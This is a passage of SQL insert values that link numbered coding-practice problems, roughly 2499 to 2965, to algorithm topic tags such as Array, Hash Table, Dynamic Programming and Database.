Table',2499),(7417,'Greedy',2499),(7418,'Counting',2499),(7419,'Array',2500),(7420,'Sorting',2500),(7421,'Heap (Priority Queue)',2500),(7422,'Matrix',2500),(7423,'Simulation',2500),(7424,'Array',2501),(7425,'Hash Table',2501),(7426,'Binary Search',2501),(7427,'Dynamic Programming',2501),(7428,'Sorting',2501),(7429,'Array',2502),(7430,'Hash Table',2502),(7431,'Design',2502),(7432,'Simulation',2502),(7433,'Array',2503),(7434,'Two Pointers',2503),(7435,'Breadth-First Search',2503),(7436,'Union Find',2503),(7437,'Sorting',2503),(7438,'Heap (Priority Queue)',2503),(7439,'Matrix',2503),(7440,'Database',2504),(7441,'Array',2505),(7442,'Math',2505),(7443,'Bit Manipulation',2505),(7444,'Brainteaser',2505),(7445,'Array',2506),(7446,'Hash Table',2506),(7447,'String',2506),(7448,'Math',2507),(7449,'Number Theory',2507),(7450,'Hash Table',2508),(7451,'Graph',2508),(7452,'Tree',2509),(7453,'Binary Tree',2509),(7454,'Array',2510),(7455,'Dynamic Programming',2510),(7456,'Matrix',2510),(7457,'Array',2511),(7458,'Two Pointers',2511),(7459,'Array',2512),(7460,'Hash Table',2512),(7461,'String',2512),(7462,'Sorting',2512),(7463,'Heap (Priority Queue)',2512),(7464,'Math',2513),(7465,'Binary Search',2513),(7466,'Number Theory',2513),(7467,'Hash Table',2514),(7468,'Math',2514),(7469,'String',2514),(7470,'Combinatorics',2514),(7471,'Counting',2514),(7472,'Array',2515),(7473,'String',2515),(7474,'Hash Table',2516),(7475,'String',2516),(7476,'Sliding Window',2516),(7477,'Array',2517),(7478,'Binary Search',2517),(7479,'Sorting',2517),(7480,'Array',2518),(7481,'Dynamic Programming',2518),(7482,'Array',2519),(7483,'Binary Search',2519),(7484,'Divide and Conquer',2519),(7485,'Binary Indexed Tree',2519),(7486,'Segment Tree',2519),(7487,'Merge Sort',2519),(7488,'Ordered Set',2519),(7489,'Math',2520),(7490,'Array',2521),(7491,'Hash Table',2521),(7492,'Math',2521),(7493,'Number Theory',2521),(7494,'String',2522),(7495,'Dynamic Programming',2522),(7496,'Greedy',2522),(7497,'Math',2523),(7498,'Number Theory',2523),(7499,'Array',2524),(7500,'Hash Table',2524),(7501,'Math',2524),(7502,'Sliding Window',2524),(7503,'Math',2525),(7504,'Hash Table',2526),(7505,'Design',2526),(7506,'Queue',2526),(7507,'Counting',2526),(7508,'Data Stream',2526),(7509,'Array',2527),(7510,'Math',2527),(7511,'Bit Manipulation',2527),(7512,'Array',2528),(7513,'Binary Search',2528),(7514,'Greedy',2528),(7515,'Queue',2528),(7516,'Sliding Window',2528),(7517,'Prefix Sum',2528),(7518,'Array',2529),(7519,'Binary Search',2529),(7520,'Counting',2529),(7521,'Array',2530),(7522,'Greedy',2530),(7523,'Heap (Priority Queue)',2530),(7524,'Hash Table',2531),(7525,'String',2531),(7526,'Counting',2531),(7527,'Array',2532),(7528,'Heap (Priority Queue)',2532),(7529,'Simulation',2532),(7530,'Dynamic Programming',2533),(7531,'Array',2534),(7532,'Queue',2534),(7533,'Simulation',2534),(7534,'Array',2535),(7535,'Math',2535),(7536,'Array',2536),(7537,'Matrix',2536),(7538,'Prefix Sum',2536),(7539,'Array',2537),(7540,'Hash Table',2537),(7541,'Sliding Window',2537),(7542,'Array',2538),(7543,'Dynamic Programming',2538),(7544,'Tree',2538),(7545,'Depth-First Search',2538),(7546,'Hash Table',2539),(7547,'Math',2539),(7548,'String',2539),(7549,'Combinatorics',2539),(7550,'Counting',2539),(7551,'Array',2540),(7552,'Hash Table',2540),(7553,'Two Pointers',2540),(7554,'Binary Search',2540),(7555,'Array',2541),(7556,'Math',2541),(7557,'Greedy',2541),(7558,'Array',2542),(7559,'Greedy',2542),(7560,'Sorting',2542),(7561,'Heap (Priority Queue)',2542),(7562,'Math',2543),(7563,'Number Theory',2543),(7564,'Math',2544),(7565,'Array',2545),(7566,'Sorting',2545),(7567,'Matrix',2545),(7568,'String',2546),(7569,'Bit Manipulation',2546),(7570,'Array',2547),(7571,'Hash Table',2547),(7572,'Dynamic Programming',2547),(7573,'Counting',2547),(7574,'Array',2548),(7575,'Greedy',2548),(7576,'Sorting',2548),(7577,'Array',2549),(7578,'Hash Table',2549),(7579,'Math',2549),(7580,'Simulation',2549),(7581,'Math',2550),(7582,'Recursion',2550),(7583,'Array',2551),(7584,'Greedy',2551),(7585,'Sorting',2551),(7586,'Heap (Priority Queue)',2551),(7587,'Array',2552),(7588,'Dynamic Programming',2552),(7589,'Binary Indexed Tree',2552),(7590,'Enumeration',2552),(7591,'Prefix Sum',2552),(7592,'Array',2553),(7593,'Simulation',2553),(7594,'Array',2554),(7595,'Hash Table',2554),(7596,'Binary Search',2554),(7597,'Greedy',2554),(7598,'Sorting',2554),(7599,'Array',2555),(7600,'Binary Search',2555),(7601,'Sliding Window',2555),(7602,'Array',2556),(7603,'Dynamic Programming',2556),(7604,'Depth-First Search',2556),(7605,'Breadth-First Search',2556),(7606,'Matrix',2556),(7607,'Array',2557),(7608,'Binary Search',2557),(7609,'Greedy',2557),(7610,'Sorting',2557),(7611,'Array',2558),(7612,'Heap (Priority Queue)',2558),(7613,'Simulation',2558),(7614,'Array',2559),(7615,'String',2559),(7616,'Prefix Sum',2559),(7617,'Array',2560),(7618,'Binary Search',2560),(7619,'Array',2561),(7620,'Hash Table',2561),(7621,'Greedy',2561),(7622,'Array',2562),(7623,'Two Pointers',2562),(7624,'Simulation',2562),(7625,'Array',2563),(7626,'Two Pointers',2563),(7627,'Binary Search',2563),(7628,'Sorting',2563),(7629,'Array',2564),(7630,'Hash Table',2564),(7631,'String',2564),(7632,'Bit Manipulation',2564),(7633,'Two Pointers',2565),(7634,'String',2565),(7635,'Binary Search',2565),(7636,'Math',2566),(7637,'Greedy',2566),(7638,'Array',2567),(7639,'Greedy',2567),(7640,'Sorting',2567),(7641,'Array',2568),(7642,'Bit Manipulation',2568),(7643,'Brainteaser',2568),(7644,'Array',2569),(7645,'Segment Tree',2569),(7646,'Array',2570),(7647,'Hash Table',2570),(7648,'Two Pointers',2570),(7649,'Dynamic Programming',2571),(7650,'Greedy',2571),(7651,'Bit Manipulation',2571),(7652,'Array',2572),(7653,'Math',2572),(7654,'Dynamic Programming',2572),(7655,'Bit Manipulation',2572),(7656,'Bitmask',2572),(7657,'Array',2573),(7658,'String',2573),(7659,'Dynamic Programming',2573),(7660,'Greedy',2573),(7661,'Union Find',2573),(7662,'Matrix',2573),(7663,'Array',2574),(7664,'Prefix Sum',2574),(7665,'Array',2575),(7666,'Math',2575),(7667,'String',2575),(7668,'Array',2576),(7669,'Two Pointers',2576),(7670,'Binary Search',2576),(7671,'Greedy',2576),(7672,'Sorting',2576),(7673,'Array',2577),(7674,'Breadth-First Search',2577),(7675,'Graph',2577),(7676,'Heap (Priority Queue)',2577),(7677,'Matrix',2577),(7678,'Shortest Path',2577),(7679,'Math',2578),(7680,'Greedy',2578),(7681,'Sorting',2578),(7682,'Math',2579),(7683,'Array',2580),(7684,'Sorting',2580),(7685,'Hash Table',2581),(7686,'Dynamic Programming',2581),(7687,'Tree',2581),(7688,'Depth-First Search',2581),(7689,'Math',2582),(7690,'Simulation',2582),(7691,'Tree',2583),(7692,'Breadth-First Search',2583),(7693,'Sorting',2583),(7694,'Binary Tree',2583),(7695,'Array',2584),(7696,'Hash Table',2584),(7697,'Math',2584),(7698,'Number Theory',2584),(7699,'Array',2585),(7700,'Dynamic Programming',2585),(7701,'Array',2586),(7702,'String',2586),(7703,'Array',2587),(7704,'Greedy',2587),(7705,'Sorting',2587),(7706,'Prefix Sum',2587),(7707,'Array',2588),(7708,'Hash Table',2588),(7709,'Bit Manipulation',2588),(7710,'Prefix Sum',2588),(7711,'Array',2589),(7712,'Binary Search',2589),(7713,'Stack',2589),(7714,'Greedy',2589),(7715,'Sorting',2589),(7716,'Array',2590),(7717,'Hash Table',2590),(7718,'String',2590),(7719,'Design',2590),(7720,'Sorting',2590),(7721,'Math',2591),(7722,'Greedy',2591),(7723,'Array',2592),(7724,'Two Pointers',2592),(7725,'Greedy',2592),(7726,'Sorting',2592),(7727,'Array',2593),(7728,'Sorting',2593),(7729,'Heap (Priority Queue)',2593),(7730,'Simulation',2593),(7731,'Array',2594),(7732,'Binary Search',2594),(7733,'Bit Manipulation',2595),(7734,'Array',2596),(7735,'Depth-First Search',2596),(7736,'Breadth-First Search',2596),(7737,'Matrix',2596),(7738,'Simulation',2596),(7739,'Array',2597),(7740,'Dynamic Programming',2597),(7741,'Backtracking',2597),(7742,'Array',2598),(7743,'Hash Table',2598),(7744,'Math',2598),(7745,'Greedy',2598),(7746,'Array',2599),(7747,'Greedy',2599),(7748,'Heap (Priority Queue)',2599),(7749,'Math',2600),(7750,'Greedy',2600),(7751,'Array',2601),(7752,'Math',2601),(7753,'Binary Search',2601),(7754,'Greedy',2601),(7755,'Number Theory',2601),(7756,'Array',2602),(7757,'Binary Search',2602),(7758,'Sorting',2602),(7759,'Prefix Sum',2602),(7760,'Array',2603),(7761,'Tree',2603),(7762,'Graph',2603),(7763,'Topological Sort',2603),(7764,'Array',2604),(7765,'Binary Search',2604),(7766,'Sorting',2604),(7767,'Array',2605),(7768,'Hash Table',2605),(7769,'Enumeration',2605),(7770,'Array',2606),(7771,'Hash Table',2606),(7772,'String',2606),(7773,'Dynamic Programming',2606),(7774,'Array',2607),(7775,'Math',2607),(7776,'Sorting',2607),(7777,'Number Theory',2607),(7778,'Breadth-First Search',2608),(7779,'Graph',2608),(7780,'String',2609),(7781,'Array',2610),(7782,'Hash Table',2610),(7783,'Array',2611),(7784,'Greedy',2611),(7785,'Sorting',2611),(7786,'Heap (Priority Queue)',2611),(7787,'Array',2612),(7788,'Breadth-First Search',2612),(7789,'Ordered Set',2612),(7790,'Array',2613),(7791,'Math',2613),(7792,'Divide and Conquer',2613),(7793,'Geometry',2613),(7794,'Sorting',2613),(7795,'Ordered Set',2613),(7796,'Array',2614),(7797,'Math',2614),(7798,'Matrix',2614),(7799,'Number Theory',2614),(7800,'Array',2615),(7801,'Hash Table',2615),(7802,'Prefix Sum',2615),(7803,'Array',2616),(7804,'Binary Search',2616),(7805,'Greedy',2616),(7806,'Array',2617),(7807,'Binary Search',2617),(7808,'Dynamic Programming',2617),(7809,'Stack',2617),(7810,'Union Find',2617),(7811,'Binary Indexed Tree',2617),(7812,'Segment Tree',2617),(7813,'Array',2638),(7814,'Dynamic Programming',2638),(7815,'Sorting',2638),(7816,'Array',2639),(7817,'Matrix',2639),(7818,'Array',2640),(7819,'Prefix Sum',2640),(7820,'Hash Table',2641),(7821,'Tree',2641),(7822,'Depth-First Search',2641),(7823,'Breadth-First Search',2641),(7824,'Binary Tree',2641),(7825,'Graph',2642),(7826,'Design',2642),(7827,'Heap (Priority Queue)',2642),(7828,'Shortest Path',2642),(7829,'Array',2643),(7830,'Matrix',2643),(7831,'Array',2644),(7832,'String',2645),(7833,'Dynamic Programming',2645),(7834,'Stack',2645),(7835,'Greedy',2645),(7836,'Array',2646),(7837,'Dynamic Programming',2646),(7838,'Tree',2646),(7839,'Depth-First Search',2646),(7840,'Graph',2646),(7841,'Array',2647),(7842,'Math',2647),(7843,'Math',2651),(7844,'Math',2652),(7845,'Array',2653),(7846,'Hash Table',2653),(7847,'Sliding Window',2653),(7848,'Array',2654),(7849,'Math',2654),(7850,'Number Theory',2654),(7851,'Array',2655),(7852,'Sorting',2655),(7853,'Array',2656),(7854,'Greedy',2656),(7855,'Array',2657),(7856,'Hash Table',2657),(7857,'Bit Manipulation',2657),(7858,'Array',2658),(7859,'Depth-First Search',2658),(7860,'Breadth-First Search',2658),(7861,'Union Find',2658),(7862,'Matrix',2658),(7863,'Array',2659),(7864,'Binary Search',2659),(7865,'Greedy',2659),(7866,'Binary Indexed Tree',2659),(7867,'Segment Tree',2659),(7868,'Sorting',2659),(7869,'Ordered Set',2659),(7870,'Array',2660),(7871,'Simulation',2660),(7872,'Array',2661),(7873,'Hash Table',2661),(7874,'Matrix',2661),(7875,'Array',2662),(7876,'Graph',2662),(7877,'Heap (Priority Queue)',2662),(7878,'Shortest Path',2662),(7879,'String',2663),(7880,'Greedy',2663),(7881,'Array',2664),(7882,'Backtracking',2664),(7883,'Matrix',2664),(7884,'Database',2668),(7885,'Database',2669),(7886,'Array',2670),(7887,'Hash Table',2670),(7888,'Hash Table',2671),(7889,'Design',2671),(7890,'Array',2672),(7891,'Array',2673),(7892,'Dynamic Programming',2673),(7893,'Greedy',2673),(7894,'Tree',2673),(7895,'Binary Tree',2673),(7896,'Array',2678),(7897,'String',2678),(7898,'Array',2679),(7899,'Sorting',2679),(7900,'Heap (Priority Queue)',2679),(7901,'Matrix',2679),(7902,'Simulation',2679),(7903,'Array',2680),(7904,'Greedy',2680),(7905,'Bit Manipulation',2680),(7906,'Prefix Sum',2680),(7907,'Array',2681),(7908,'Math',2681),(7909,'Sorting',2681),(7910,'Prefix Sum',2681),(7911,'Array',2682),(7912,'Hash Table',2682),(7913,'Simulation',2682),(7914,'Array',2683),(7915,'Bit Manipulation',2683),(7916,'Array',2684),(7917,'Dynamic Programming',2684),(7918,'Matrix',2684),(7919,'Depth-First Search',2685),(7920,'Breadth-First Search',2685),(7921,'Graph',2685),(7922,'Database',2686),(7923,'Database',2687),(7924,'Database',2688),(7925,'Tree',2689),(7926,'Depth-First Search',2689),(7927,'String',2696),(7928,'Stack',2696),(7929,'Simulation',2696),(7930,'Two Pointers',2697),(7931,'String',2697),(7932,'Greedy',2697),(7933,'Math',2698),(7934,'Backtracking',2698),(7935,'Graph',2699),(7936,'Heap (Priority Queue)',2699),(7937,'Shortest Path',2699),(7938,'Database',2701),(7939,'Array',2702),(7940,'Binary Search',2702),(7941,'Array',2706),(7942,'Sorting',2706),(7943,'Array',2707),(7944,'Hash Table',2707),(7945,'String',2707),(7946,'Dynamic Programming',2707),(7947,'Trie',2707),(7948,'Array',2708),(7949,'Backtracking',2708),(7950,'Greedy',2708),(7951,'Sorting',2708),(7952,'Array',2709),(7953,'Math',2709),(7954,'Union Find',2709),(7955,'Number Theory',2709),(7956,'String',2710),(7957,'Array',2711),(7958,'Hash Table',2711),(7959,'Matrix',2711),(7960,'String',2712),(7961,'Dynamic Programming',2712),(7962,'Greedy',2712),(7963,'Array',2713),(7964,'Binary Search',2713),(7965,'Dynamic Programming',2713),(7966,'Memoization',2713),(7967,'Sorting',2713),(7968,'Matrix',2713),(7969,'Graph',2714),(7970,'Heap (Priority Queue)',2714),(7971,'Shortest Path',2714),(7972,'Hash Table',2716),(7973,'String',2716),(7974,'Array',2717),(7975,'Simulation',2717),(7976,'Array',2718),(7977,'Hash Table',2718),(7978,'Math',2719),(7979,'String',2719),(7980,'Dynamic Programming',2719),(7981,'Database',2720),(7982,'Array',2728),(7983,'Interactive',2728),(7984,'Hash Table',2729),(7985,'Math',2729),(7986,'String',2730),(7987,'Sliding Window',2730),(7988,'Array',2731),(7989,'Brainteaser',2731),(7990,'Sorting',2731),(7991,'Prefix Sum',2731),(7992,'Array',2732),(7993,'Greedy',2732),(7994,'Bit Manipulation',2732),(7995,'Matrix',2732),(7996,'Array',2733),(7997,'Sorting',2733),(7998,'String',2734),(7999,'Greedy',2734),(8000,'Array',2735),(8001,'Enumeration',2735),(8002,'Array',2736),(8003,'Binary Search',2736),(8004,'Stack',2736),(8005,'Binary Indexed Tree',2736),(8006,'Segment Tree',2736),(8007,'Sorting',2736),(8008,'Monotonic Stack',2736),(8009,'Array',2737),(8010,'Graph',2737),(8011,'Heap (Priority Queue)',2737),(8012,'Shortest Path',2737),(8013,'Database',2738),(8014,'Math',2739),(8015,'Simulation',2739),(8016,'Array',2740),(8017,'Sorting',2740),(8018,'Array',2741),(8019,'Dynamic Programming',2741),(8020,'Bit Manipulation',2741),(8021,'Bitmask',2741),(8022,'Array',2742),(8023,'Dynamic Programming',2742),(8024,'Hash Table',2743),(8025,'String',2743),(8026,'Sliding Window',2743),(8027,'Array',2744),(8028,'Hash Table',2744),(8029,'String',2744),(8030,'Simulation',2744),(8031,'Math',2745),(8032,'Greedy',2745),(8033,'Brainteaser',2745),(8034,'Array',2746),(8035,'String',2746),(8036,'Dynamic Programming',2746),(8037,'Array',2747),(8038,'Hash Table',2747),(8039,'Sliding Window',2747),(8040,'Sorting',2747),(8041,'Array',2748),(8042,'Math',2748),(8043,'Number Theory',2748),(8044,'Bit Manipulation',2749),(8045,'Brainteaser',2749),(8046,'Array',2750),(8047,'Math',2750),(8048,'Dynamic Programming',2750),(8049,'Array',2751),(8050,'Stack',2751),(8051,'Sorting',2751),(8052,'Simulation',2751),(8053,'Database',2752),(8054,'Array',2760),(8055,'Sliding Window',2760),(8056,'Array',2762),(8057,'Queue',2762),(8058,'Sliding Window',2762),(8059,'Heap (Priority Queue)',2762),(8060,'Ordered Set',2762),(8061,'Monotonic Queue',2762),(8062,'Array',2763),(8063,'Hash Table',2763),(8064,'Ordered Set',2763),(8065,'Stack',2764),(8066,'Tree',2764),(8067,'Depth-First Search',2764),(8068,'Binary Tree',2764),(8069,'Array',2765),(8070,'Enumeration',2765),(8071,'Array',2766),(8072,'Hash Table',2766),(8073,'Sorting',2766),(8074,'Simulation',2766),(8075,'Hash Table',2767),(8076,'String',2767),(8077,'Dynamic Programming',2767),(8078,'Backtracking',2767),(8079,'Array',2768),(8080,'Hash Table',2768),(8081,'Enumeration',2768),(8082,'Math',2769),(8083,'Array',2770),(8084,'Dynamic Programming',2770),(8085,'Array',2771),(8086,'Dynamic Programming',2771),(8087,'Array',2772),(8088,'Prefix Sum',2772),(8089,'Array',2778),(8090,'Simulation',2778),(8091,'Array',2779),(8092,'Binary Search',2779),(8093,'Sliding Window',2779),(8094,'Sorting',2779),(8095,'Array',2780),(8096,'Hash Table',2780),(8097,'Sorting',2780),(8098,'Array',2781),(8099,'Hash Table',2781),(8100,'String',2781),(8101,'Sliding Window',2781),(8102,'Union Find',2782),(8103,'Counting',2782),(8104,'Database',2783),(8105,'Array',2784),(8106,'Hash Table',2784),(8107,'Sorting',2784),(8108,'String',2785),(8109,'Sorting',2785),(8110,'Array',2786),(8111,'Dynamic Programming',2786),(8112,'Dynamic Programming',2787),(8113,'Array',2788),(8114,'String',2788),(8115,'Array',2789),(8116,'Greedy',2789),(8117,'Prefix Sum',2789),(8118,'Array',2790),(8119,'Math',2790),(8120,'Binary Search',2790),(8121,'Greedy',2790),(8122,'Sorting',2790),(8123,'Dynamic Programming',2791),(8124,'Bit Manipulation',2791),(8125,'Tree',2791),(8126,'Depth-First Search',2791),(8127,'Bitmask',2791),(8128,'Array',2798),(8129,'Enumeration',2798),(8130,'Array',2799),(8131,'Hash Table',2799),(8132,'Sliding Window',2799),(8133,'String',2800),(8134,'Greedy',2800),(8135,'Enumeration',2800),(8136,'String',2801),(8137,'Dynamic Programming',2801),(8138,'Math',2806),(8139,'Linked List',2807),(8140,'Math',2807),(8141,'Number Theory',2807),(8142,'Array',2808),(8143,'Hash Table',2808),(8144,'Greedy',2808),(8145,'Array',2809),(8146,'Dynamic Programming',2809),(8147,'Sorting',2809),(8148,'String',2810),(8149,'Simulation',2810),(8150,'Array',2811),(8151,'Dynamic Programming',2811),(8152,'Greedy',2811),(8153,'Array',2812),(8154,'Binary Search',2812),(8155,'Breadth-First Search',2812),(8156,'Union Find',2812),(8157,'Matrix',2812),(8158,'Array',2813),(8159,'Hash Table',2813),(8160,'Greedy',2813),(8161,'Sorting',2813),(8162,'Heap (Priority Queue)',2813),(8163,'Array',2814),(8164,'Breadth-First Search',2814),(8165,'Matrix',2814),(8166,'Array',2815),(8167,'Hash Table',2815),(8168,'Linked List',2816),(8169,'Math',2816),(8170,'Stack',2816),(8171,'Array',2817),(8172,'Binary Search',2817),(8173,'Ordered Set',2817),(8174,'Array',2818),(8175,'Math',2818),(8176,'Stack',2818),(8177,'Greedy',2818),(8178,'Monotonic Stack',2818),(8179,'Number Theory',2818),(8180,'Array',2824),(8181,'Two Pointers',2824),(8182,'Sorting',2824),(8183,'Two Pointers',2825),(8184,'String',2825),(8185,'Array',2826),(8186,'Dynamic Programming',2826),(8187,'Math',2827),(8188,'Dynamic Programming',2827),(8189,'Array',2828),(8190,'String',2828),(8191,'Math',2829),(8192,'Greedy',2829),(8193,'Array',2830),(8194,'Binary Search',2830),(8195,'Dynamic Programming',2830),(8196,'Sorting',2830),(8197,'Array',2831),(8198,'Hash Table',2831),(8199,'Binary Search',2831),(8200,'Sliding Window',2831),(8201,'Array',2832),(8202,'Stack',2832),(8203,'Monotonic Stack',2832),(8204,'Array',2833),(8205,'Counting',2833),(8206,'Math',2834),(8207,'Greedy',2834),(8208,'Array',2835),(8209,'Greedy',2835),(8210,'Bit Manipulation',2835),(8211,'Array',2836),(8212,'Dynamic Programming',2836),(8213,'Bit Manipulation',2836),(8214,'Database',2837),(8215,'Array',2838),(8216,'Two Pointers',2838),(8217,'Binary Search',2838),(8218,'Sorting',2838),(8219,'Prefix Sum',2838),(8220,'String',2839),(8221,'Hash Table',2840),(8222,'String',2840),(8223,'Sorting',2840),(8224,'Array',2841),(8225,'Hash Table',2841),(8226,'Sliding Window',2841),(8227,'Hash Table',2842),(8228,'Math',2842),(8229,'String',2842),(8230,'Greedy',2842),(8231,'Combinatorics',2842),(8232,'Math',2843),(8233,'Enumeration',2843),(8234,'Math',2844),(8235,'String',2844),(8236,'Greedy',2844),(8237,'Enumeration',2844),(8238,'Array',2845),(8239,'Hash Table',2845),(8240,'Prefix Sum',2845),(8241,'Array',2846),(8242,'Tree',2846),(8243,'Graph',2846),(8244,'Strongly Connected Component',2846),(8245,'Math',2847),(8246,'Greedy',2847),(8247,'Hash Table',2848),(8248,'Math',2848),(8249,'Prefix Sum',2848),(8250,'Math',2849),(8251,'Array',2850),(8252,'Dynamic Programming',2850),(8253,'Breadth-First Search',2850),(8254,'Matrix',2850),(8255,'Math',2851),(8256,'String',2851),(8257,'Dynamic Programming',2851),(8258,'String Matching',2851),(8259,'Array',2852),(8260,'Depth-First Search',2852),(8261,'Breadth-First Search',2852),(8262,'Union Find',2852),(8263,'Matrix',2852),(8264,'Database',2853),(8265,'Database',2854),(8266,'Array',2855),(8267,'Array',2856),(8268,'Hash Table',2856),(8269,'Two Pointers',2856),(8270,'Binary Search',2856),(8271,'Greedy',2856),(8272,'Counting',2856),(8273,'Array',2857),(8274,'Hash Table',2857),(8275,'Bit Manipulation',2857),(8276,'Dynamic Programming',2858),(8277,'Depth-First Search',2858),(8278,'Breadth-First Search',2858),(8279,'Graph',2858),(8280,'Array',2859),(8281,'Bit Manipulation',2859),(8282,'Array',2860),(8283,'Sorting',2860),(8284,'Enumeration',2860),(8285,'Array',2861),(8286,'Binary Search',2861),(8287,'Array',2862),(8288,'Math',2862),(8289,'Number Theory',2862),(8290,'Array',2863),(8291,'Hash Table',2863),(8292,'Sorting',2863),(8293,'Math',2864),(8294,'String',2864),(8295,'Greedy',2864),(8296,'Array',2865),(8297,'Stack',2865),(8298,'Monotonic Stack',2865),(8299,'Array',2866),(8300,'Stack',2866),(8301,'Monotonic Stack',2866),(8302,'Math',2867),(8303,'Dynamic Programming',2867),(8304,'Tree',2867),(8305,'Depth-First Search',2867),(8306,'Number Theory',2867),(8307,'Array',2868),(8308,'Math',2868),(8309,'Two Pointers',2868),(8310,'String',2868),(8311,'Game Theory',2868),(8312,'Array',2869),(8313,'Hash Table',2869),(8314,'Array',2870),(8315,'Hash Table',2870),(8316,'Greedy',2870),(8317,'Counting',2870),(8318,'Array',2871),(8319,'Greedy',2871),(8320,'Bit Manipulation',2871),(8321,'Tree',2872),(8322,'Depth-First Search',2872),(8323,'Array',2873),(8324,'Array',2874),(8325,'Array',2875),(8326,'Hash Table',2875),(8327,'Sliding Window',2875),(8328,'Prefix Sum',2875),(8329,'Dynamic Programming',2876),(8330,'Graph',2876),(8331,'Memoization',2876),(8332,'Array',2892),(8333,'Dynamic Programming',2892),(8334,'Greedy',2892),(8335,'Database',2893),(8336,'Math',2894),(8337,'Array',2895),(8338,'Greedy',2895),(8339,'Sorting',2895),(8340,'String',2896),(8341,'Dynamic Programming',2896),(8342,'Array',2897),(8343,'Hash Table',2897),(8344,'Greedy',2897),(8345,'Bit Manipulation',2897),(8346,'Array',2898),(8347,'Hash Table',2898),(8348,'Array',2899),(8349,'String',2899),(8350,'Simulation',2899),(8351,'Array',2900),(8352,'String',2900),(8353,'Dynamic Programming',2900),(8354,'Greedy',2900),(8355,'Array',2901),(8356,'String',2901),(8357,'Dynamic Programming',2901),(8358,'Array',2902),(8359,'Hash Table',2902),(8360,'Dynamic Programming',2902),(8361,'Sliding Window',2902),(8362,'Array',2903),(8363,'String',2904),(8364,'Sliding Window',2904),(8365,'Array',2905),(8366,'Array',2906),(8367,'Matrix',2906),(8368,'Prefix Sum',2906),(8369,'Array',2907),(8370,'Dynamic Programming',2907),(8371,'Array',2908),(8372,'Array',2909),(8373,'Array',2910),(8374,'Hash Table',2910),(8375,'Greedy',2910),(8376,'Two Pointers',2911),(8377,'String',2911),(8378,'Dynamic Programming',2911),(8379,'Math',2912),(8380,'Dynamic Programming',2912),(8381,'Combinatorics',2912),(8382,'Array',2913),(8383,'Hash Table',2913),(8384,'String',2914),(8385,'Array',2915),(8386,'Dynamic Programming',2915),(8387,'Array',2916),(8388,'Dynamic Programming',2916),(8389,'Binary Indexed Tree',2916),(8390,'Segment Tree',2916),(8391,'Array',2917),(8392,'Bit Manipulation',2917),(8393,'Array',2918),(8394,'Greedy',2918),(8395,'Array',2919),(8396,'Dynamic Programming',2919),(8397,'Array',2920),(8398,'Dynamic Programming',2920),(8399,'Bit Manipulation',2920),(8400,'Tree',2920),(8401,'Depth-First Search',2920),(8402,'Array',2921),(8403,'Binary Indexed Tree',2921),(8404,'Database',2922),(8405,'Array',2923),(8406,'Matrix',2923),(8407,'Graph',2924),(8408,'Dynamic Programming',2925),(8409,'Tree',2925),(8410,'Depth-First Search',2925),(8411,'Array',2926),(8412,'Binary Search',2926),(8413,'Dynamic Programming',2926),(8414,'Binary Indexed Tree',2926),(8415,'Segment Tree',2926),(8416,'Math',2927),(8417,'Combinatorics',2927),(8418,'Math',2928),(8419,'Combinatorics',2928),(8420,'Enumeration',2928),(8421,'Math',2929),(8422,'Combinatorics',2929),(8423,'Enumeration',2929),(8424,'Math',2930),(8425,'Dynamic Programming',2930),(8426,'Combinatorics',2930),(8427,'Array',2931),(8428,'Greedy',2931),(8429,'Sorting',2931),(8430,'Heap (Priority Queue)',2931),(8431,'Matrix',2931),(8432,'Array',2932),(8433,'Hash Table',2932),(8434,'Bit Manipulation',2932),(8435,'Trie',2932),(8436,'Sliding Window',2932),(8437,'Array',2933),(8438,'Hash Table',2933),(8439,'String',2933),(8440,'Sorting',2933),(8441,'Array',2934),(8442,'Greedy',2934),(8443,'Array',2935),(8444,'Hash Table',2935),(8445,'Bit Manipulation',2935),(8446,'Trie',2935),(8447,'Sliding Window',2935),(8448,'Array',2936),(8449,'Binary Search',2936),(8450,'Divide and Conquer',2936),(8451,'String',2937),(8452,'Two Pointers',2938),(8453,'String',2938),(8454,'Greedy',2938),(8455,'Math',2939),(8456,'Greedy',2939),(8457,'Bit Manipulation',2939),(8458,'Array',2940),(8459,'Binary Search',2940),(8460,'Stack',2940),(8461,'Binary Indexed Tree',2940),(8462,'Segment Tree',2940),(8463,'Heap (Priority Queue)',2940),(8464,'Monotonic Stack',2940),(8465,'Array',2941),(8466,'Math',2941),(8467,'Binary Search',2941),(8468,'Number Theory',2941),(8469,'Array',2942),(8470,'String',2942),(8471,'Array',2943),(8472,'Sorting',2943),(8473,'Array',2944),(8474,'Dynamic Programming',2944),(8475,'Queue',2944),(8476,'Monotonic Queue',2944),(8477,'Array',2945),(8478,'Binary Search',2945),(8479,'Dynamic Programming',2945),(8480,'Stack',2945),(8481,'Queue',2945),(8482,'Monotonic Stack',2945),(8483,'Monotonic Queue',2945),(8484,'Array',2946),(8485,'Math',2946),(8486,'Matrix',2946),(8487,'Simulation',2946),(8488,'String',2947),(8489,'Enumeration',2947),(8490,'Prefix Sum',2947),(8491,'Array',2948),(8492,'Union Find',2948),(8493,'Sorting',2948),(8494,'Hash Table',2949),(8495,'Math',2949),(8496,'String',2949),(8497,'Number Theory',2949),(8498,'Prefix Sum',2949),(8499,'Hash Table',2950),(8500,'String',2950),(8501,'Counting',2950),(8502,'Prefix Sum',2950),(8503,'Array',2951),(8504,'Enumeration',2951),(8505,'Array',2952),(8506,'Greedy',2952),(8507,'Sorting',2952),(8508,'Hash Table',2953),(8509,'String',2953),(8510,'Sliding Window',2953),(8511,'Array',2954),(8512,'Math',2954),(8513,'Combinatorics',2954),(8514,'Array',2955),(8515,'Hash Table',2955),(8516,'String',2955),(8517,'Counting',2955),(8518,'Prefix Sum',2955),(8519,'Array',2956),(8520,'Hash Table',2956),(8521,'String',2957),(8522,'Dynamic Programming',2957),(8523,'Greedy',2957),(8524,'Array',2958),(8525,'Hash Table',2958),(8526,'Sliding Window',2958),(8527,'Bit Manipulation',2959),(8528,'Graph',2959),(8529,'Heap (Priority Queue)',2959),(8530,'Enumeration',2959),(8531,'Shortest Path',2959),(8532,'Array',2960),(8533,'Simulation',2960),(8534,'Array',2961),(8535,'Math',2961),(8536,'Simulation',2961),(8537,'Array',2962),(8538,'Sliding Window',2962),(8539,'Array',2963),(8540,'Hash Table',2963),(8541,'Math',2963),(8542,'Combinatorics',2963),(8543,'Array',2964),(8544,'Hash Table',2964),(8545,'Array',2965),(8546,'Hash 